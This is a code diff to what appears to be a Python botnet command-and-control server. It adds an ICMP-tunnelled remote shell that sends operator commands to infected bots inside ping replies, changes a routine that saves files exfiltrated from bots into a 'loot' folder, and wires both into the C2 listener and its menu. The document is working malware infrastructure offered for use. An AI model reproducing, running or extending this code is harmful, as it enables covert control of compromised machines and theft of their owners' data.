@@ -21,6 +21,96 @@ import signal
 import os
 from scapy.all import *
 
+# ICMP shell for single bot
+def icmpshell(botNum,botIP,botShell):
+	print "[*] ICMP shell for bot(%s) at %s" % (botNum, botIP)
+	if subprocess.mswindows:
+        	sys.stderr.write('icmpsh master can only run on Posix systems\n')
+        	sys.exit(255)
+
+    	try:
+        	from impacket import ImpactDecoder
+        	from impacket import ImpactPacket
+    	except ImportError:
+        	sys.stderr.write('You need to install Python Impacket library first\n')
+        	sys.exit(255)
+
+    	# Open one socket for ICMP protocol
+    	# A special option is set on the socket so that IP headers are included
+    	# with the returned data
+    	try:
+        	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    	except socket.error, e:
+        	sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
+        	sys.exit(1)
+
+    	sock.setblocking(0)
+    	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+    	# Create a new IP packet and set its source and destination addresses
+    	ip = ImpactPacket.IP()
+	#print "[D] Local IP: %s" % sock.getsockname()
+    	#ip.set_ip_src(sock.getsockname()[0])
+    	ip.set_ip_dst(botIP)
+
+    	# Create a new ICMP packet of type ECHO REPLY
+    	icmp = ImpactPacket.ICMP()
+    	icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
+
+    	# Instantiate an IP packets decoder
+    	decoder = ImpactDecoder.IPDecoder()
+
+    	while 1:
+        	cmd = ''
+
+        	# Wait for incoming replies
+        	if sock in select.select([ sock ], [], [])[0]:
+            		buff = sock.recv(4096)
+
+            	if 0 == len(buff):
+                	# Socket remotely closed
+                	sock.close()
+                	sys.exit(0)
+
+            	# Packet received; decode and display it
+            	ippacket = decoder.decode(buff)
+            	icmppacket = ippacket.child()
+
+            	# If the packet matches, report it to the user
+            	if ippacket.get_ip_src() == botIP and 8 == icmppacket.get_icmp_type():
+                	# Get identifier and sequence number
+                	ident = icmppacket.get_icmp_id()
+                	seq_id = icmppacket.get_icmp_seq()
+                	data = icmppacket.get_data_as_string()
+			#print "Data received: %s" % str(data)
+                	if len(data) > 0:
+                    		sys.stdout.write(data)
+
+                	# Parse command from standard input
+                	try:
+                    		cmd = sys.stdin.readline()
+                	except Exception,e:
+                    		print str(e)
+
+                	# Set sequence number and identifier
+                	icmp.set_icmp_id(ident)
+                	icmp.set_icmp_seq(seq_id)
+
+                	# Include the command as data inside the ICMP packet
+                	icmp.contains(ImpactPacket.Data(cmd))
+
+                	# Calculate its checksum
+                	icmp.set_icmp_cksum(0)
+                	icmp.auto_checksum = 1
+
+                	# Have the IP packet contain the ICMP packet (along with its payload)
+                	ip.contains(icmp)
+
+                	# Send it to the target host
+                	sock.sendto(ip.get_packet(), (botIP, 0))
+			if cmd == 'exit\n':
+                    		return	
+
 def getBotIP(botId):
 	print "[*] Getting bot(%s) IP address" % botId
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
@@ -33,112 +123,12 @@ def getBotIP(botId):
 	query = "select remoteip from bots where id=%s" % botId
 	cur.execute(query)
 	row = cur.fetchone()
-	db.close()
-	return row[0] 	
-
-def setNonBlocking(fd):
-    	"""
-    	Make a file descriptor non-blocking
-    	"""
-
-    	import fcntl
-
-    	flags = fcntl.fcntl(fd, fcntl.F_GETFL)
-    	flags = flags | os.O_NONBLOCK
-    	fcntl.fcntl(fd, fcntl.F_SETFL, flags)
-
-# Code for icmpsh taken from https://github.com/inquisb/icmpsh/blob/master/icmpsh_m.py
-#  great job guys
-def icmpsh(dst):
-	if subprocess.mswindows:
-        	sys.stderr.write('icmpsh master can only run on Posix systems\n')
-        	sys.exit(255)
-	
-	try:
-        	from impacket import ImpactDecoder
-        	from impacket import ImpactPacket
-    	except ImportError:
-        	sys.stderr.write('You need to install Python Impacket library first\n')
-        	sys.exit(255)
-
-    	# Make standard input a non-blocking file
-	stdin_fd = sys.stdin.fileno()
-    	setNonBlocking(stdin_fd)
-    	# Open one socket for ICMP protocol
-    	# A special option is set on the socket so that IP headers are included
-    	# with the returned data
-    	try:
-        	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    	except socket.error, e:
-        	sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
-        	sys.exit(1)
-
-    	sock.setblocking(0)
-    	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    	# Create a new IP packet and set its source and destination addresses
-    	ip = ImpactPacket.IP()
-    	#ip.set_ip_src(src)
-    	ip.set_ip_dst(dst)
-
-    	# Create a new ICMP packet of type ECHO REPLY
-    	icmp = ImpactPacket.ICMP()
-    	icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
-
-    	# Instantiate an IP packets decoder
-    	decoder = ImpactDecoder.IPDecoder()
-
-	#print "[D] Select: %s" % select.select([ sock ], [], [])[0]
-    	while 1:
-        	cmd = ''
-        	
-		# Wait for incoming replies
-		if sock in select.select([ sock ], [], [])[0]:
-            		buff = sock.recv(4096)
-
-            		if 0 == len(buff):
-                		# Socket remotely closed
-                		sock.close()
-                		sys.exit(0)
-
-            		# Packet received; decode and display it
-            		ippacket = decoder.decode(buff)
-			icmppacket = ippacket.child()
-			if ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
-
-            			# Get identifier and sequence number
-            			ident = icmppacket.get_icmp_id()
-            			seq_id = icmppacket.get_icmp_seq()
-            			data = icmppacket.get_data_as_string()
-
-            			if len(data) > 0:
-            				sys.stdout.write(data)
-
-            			# Parse command from standard input
-            			try:
-            				cmd = sys.stdin.readline()
-            			except:
-                			pass
-
-            			if cmd == 'exit\n':
-            				return
-
-            			# Set sequence number and identifier
-            			icmp.set_icmp_id(ident)
-            			icmp.set_icmp_seq(seq_id)
-
-            			# Include the command as data inside the ICMP packet
-            			icmp.contains(ImpactPacket.Data(cmd))
-
-            			# Calculate its checksum
-            			icmp.set_icmp_cksum(0)
-            			icmp.auto_checksum = 1
-
-            			ip.set_ip_src(ippacket.get_ip_dst())
-	    			# Have the IP packet contain the ICMP packet (along with its payload)
-            			ip.contains(icmp)
-
-            			# Send it to the target host
-            			sock.sendto(ip.get_packet(), (dst, 0))
+	if row:
+		db.close()
+		return row[0]
+	else:
+		db.close()
+		return	
 
 # Catch file as it comes from bot
 def catchFile(request, botId):
@@ -146,16 +136,18 @@ def catchFile(request, botId):
        	filename = 'bot' + str(botId) + '_' + fileContents[2]
         filename_clean = filename.replace('/','_')
 	filename_clean = 'loot/' + filename_clean
+	#print "[D] File contents: %s" % fileContents
 	#print "[*] Catching file (%s) from bot: %s" % (filename_clean,botId)
 	if fileContents[0] == '(FILE_START)':
-		print "[*] File start: %s" % filename
+		print "[*] File start: %s" % filename_clean
 		file = open(filename_clean, 'w')
 		file.write('')
+		file.close()
 	elif fileContents[0] == '(FILE_END)':
 		print "[*] File end: %s" % filename
 		file = open(filename_clean, 'a')
 		file.write('')
-		#file.close()
+		file.close()
 	else:
 		file = open(filename_clean, 'a')
 		#print "[D] Writing line to file: %s" % str(fileContents[2:])
@@ -163,6 +155,7 @@ def catchFile(request, botId):
 		write_line = write_line + '\n'
 		file.write(write_line)
 		#print "[D] Line written: %s" % str(line)
+		file.close()
 	file.close()
 
 # Response function
@@ -280,7 +273,7 @@ def handler(signum, frame):
 	sys.exit()
 
 # Command and Control main function
-def c2main(command):
+def c2main(command,botShell):
 	print ""
         print "[*] Command received from C2: %s" % command.value
 	while True:
@@ -295,15 +288,30 @@ def c2main(command):
                 		request = p['Raw'].load
                         	ip_id = p['IP'].id
                        		icmp_id = p['ICMP'].id
-                       		#print "[*] Request: " + request
+        		
+				#print "[*] Request: " + request
 				if 'What shall I do master?' in request:
 					print "[*] Bot(%s) requesting command" % request[24:]
 					botId = int(request[24:])
 					if doesBotExist(botId):
-						print "[*] Bot ID exists, sending command"
-                                                sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value)
-                                                print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
-						print "Option: "
+						print "[*] Bot ID exists, ready to send command"
+						#print "[D] botId = %s and botShell.value = %s" % (botId,botShell.value)
+						if (botId == int(botShell.value)):
+							print "[*] Sending command to start shell to bot(%s) at %s" % (botId, p['IP'].src)
+							sendPingResponse(p['IP'].src,ip_id,icmp_id,'shell')
+							try:
+                                				icmp_shell = Process(name='ICMPshell',target=icmpshell,args=(botId,p['IP'].src,botShell,))
+                                				icmp_shell.start()
+                                				if icmp_shell.is_alive():
+                                        				print "[*] ICMP shell started for bot(%s) at %s" % (botId,p['IP'].src)
+                                				else:
+                                        				print "[X] Error starting ICMP shell"
+                        				except Exception, e:
+                                				print "[X] Error: " + str(e)
+						else:
+							sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value)
+                                                	print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
+							print "Option: "
                                         else:
                                         	print "[*] Client not registered"
                         	# Checkin function
@@ -367,8 +375,10 @@ def main():
 	manager = Manager()
 	command = manager.Namespace()
 	command.value = 'sysinfo'
+	botShell = manager.Namespace()
+	botShell.value = '123456789'
 	#print "[*] Command: %s" % command.value
-	process = Process(name='C2Listener',target=c2main,args=(command,))
+	process = Process(name='C2Listener',target=c2main,args=(command,botShell,))
 	displayMenu()
 	while True:
 		signal.signal(signal.SIGINT, handler)
@@ -388,7 +398,7 @@ def main():
 						proc.terminate()
 				print "[*] Starting new capture"
 				try:
-					process = Process(name='C2Listener',target=c2main,args=(command,))
+					process = Process(name='C2Listener',target=c2main,args=(command,botShell,))
 					process.start()
 					if process.is_alive():
 						print "[*] C2 Listening - command: %s" % command.value
@@ -399,7 +409,7 @@ def main():
 			else:
 				print "[*] No listener currently running. Starting..."
 				try:
-					process = Process(name='C2Listener',target=c2main,args=(command,))
+					process = Process(name='C2Listener',target=c2main,args=(command,botShell,))
 					process.start()
 					if process.is_alive():
 						print "[*] C2 Listening - command: %s" % command.value
@@ -425,17 +435,16 @@ def main():
 			print "[*] Bot shell!"
 			displayBots()
 			botNum = raw_input("Bot # for shell: ")
-			botIP = getBotIP(botNum)
-			print "[D] Bot IP for icmpsh: %s" % botIP
-			try:
-                        	icmp_shell = Process(name='ICMPshell',target=icmpsh,args=(botIP,))
-                                icmp_shell.start()
-                                if icmp_shell.is_alive():
-                	                print "[*] ICMP shell started for bot(%s) at %s" % (botNum,botIP)
-                                else:
-                                	print "[X] Error starting C2 listener"
-                        except Exception, e:
-                        	print "[X] Error: " + str(e)
+			if botNum == '123456789':
+				botShell.value = '123456789'
+			else:
+				botIP = getBotIP(botNum)
+				if botIP:
+					print "[*] Setting botshell value to %s" % botNum
+					botShell.value = botNum
+				else:
+					print "[X] Bot does not exist!"
+			#print "[D] Bot IP for icmpsh: %s" % botIP
 		elif option == 'S':
 			for proc in active_children():
 				if proc.name == 'C2Listener':
